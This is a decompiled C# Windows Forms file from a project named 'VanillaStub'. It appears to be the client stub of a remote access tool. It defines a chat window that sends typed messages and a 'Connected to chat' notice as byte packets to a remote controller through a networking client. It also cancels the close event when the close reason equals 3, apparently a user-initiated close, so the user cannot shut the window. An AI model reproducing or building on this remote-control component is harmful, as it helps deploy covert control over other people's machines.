using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using VanillaStub.Helpers.Networking;

namespace VanillaStub.Forms;

public class Chat : Form
{
	private IContainer components;

	public Panel panel1;

	public RichTextBox txtChat;

	public TextBox txtSend;

	private Button btnSend;

	public Chat()
	{
		InitializeComponent();
	}

	private void OnClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void btnSend_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrWhiteSpace(((Control)txtChat).get_Text()))
		{
			((Control)txtChat).set_Text("You: " + ((Control)txtSend).get_Text());
		}
		else
		{
			((TextBoxBase)txtChat).AppendText(Environment.NewLine + "You: " + ((Control)txtSend).get_Text());
		}
		List<byte> list = new List<byte>();
		list.Add(16);
		list.AddRange(Encoding.ASCII.GetBytes(((Control)txtSend).get_Text()));
		Networking.MainClient.Send(list.ToArray());
		((Control)txtSend).set_Text("");
	}

	private void KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		if ((int)e.get_KeyCode() == 13)
		{
			if (string.IsNullOrWhiteSpace(((Control)txtChat).get_Text()))
			{
				((Control)txtChat).set_Text("You: " + ((Control)txtSend).get_Text());
			}
			else
			{
				((TextBoxBase)txtChat).AppendText(Environment.NewLine + "You: " + ((Control)txtSend).get_Text());
			}
			List<byte> list = new List<byte>();
			list.Add(16);
			list.AddRange(Encoding.ASCII.GetBytes(((Control)txtSend).get_Text()));
			Networking.MainClient.Send(list.ToArray());
			((Control)txtSend).set_Text("");
		}
	}

	private void OnVisibleChange(object sender, EventArgs e)
	{
		if (((Control)this).get_Visible())
		{
			List<byte> list = new List<byte>();
			list.Add(16);
			list.AddRange(Encoding.ASCII.GetBytes("Connected to chat"));
			Networking.MainClient.Send(list.ToArray());
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0170: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Expected O, but got Unknown
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a0: Expected O, but got Unknown
		panel1 = new Panel();
		txtChat = new RichTextBox();
		txtSend = new TextBox();
		btnSend = new Button();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		panel1.set_BorderStyle((BorderStyle)1);
		((Control)panel1).get_Controls().Add((Control)(object)txtChat);
		((Control)panel1).set_Location(new Point(12, 12));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(620, 316));
		((Control)panel1).set_TabIndex(7);
		((TextBoxBase)txtChat).set_BorderStyle((BorderStyle)0);
		((Control)txtChat).set_Location(new Point(-1, -1));
		((Control)txtChat).set_Name("txtChat");
		((TextBoxBase)txtChat).set_ReadOnly(true);
		((Control)txtChat).set_Size(new Size(620, 316));
		((Control)txtChat).set_TabIndex(1);
		((Control)txtChat).set_Text("");
		((Control)txtSend).set_Location(new Point(12, 336));
		((Control)txtSend).set_Name("txtSend");
		((Control)txtSend).set_Size(new Size(539, 20));
		((Control)txtSend).set_TabIndex(8);
		((Control)txtSend).add_KeyDown(new KeyEventHandler(KeyDown));
		((Control)btnSend).set_Location(new Point(557, 334));
		((Control)btnSend).set_Name("btnSend");
		((Control)btnSend).set_Size(new Size(75, 23));
		((Control)btnSend).set_TabIndex(9);
		((Control)btnSend).set_Text("Send");
		((ButtonBase)btnSend).set_UseVisualStyleBackColor(true);
		((Control)btnSend).add_Click((EventHandler)btnSend_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(644, 368));
		((Control)this).get_Controls().Add((Control)(object)btnSend);
		((Control)this).get_Controls().Add((Control)(object)txtSend);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Chat");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("Chat");
		((Form)this).add_FormClosing(new FormClosingEventHandler(OnClosing));
		((Control)this).add_VisibleChanged((EventHandler)OnVisibleChange);
		((Control)panel1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
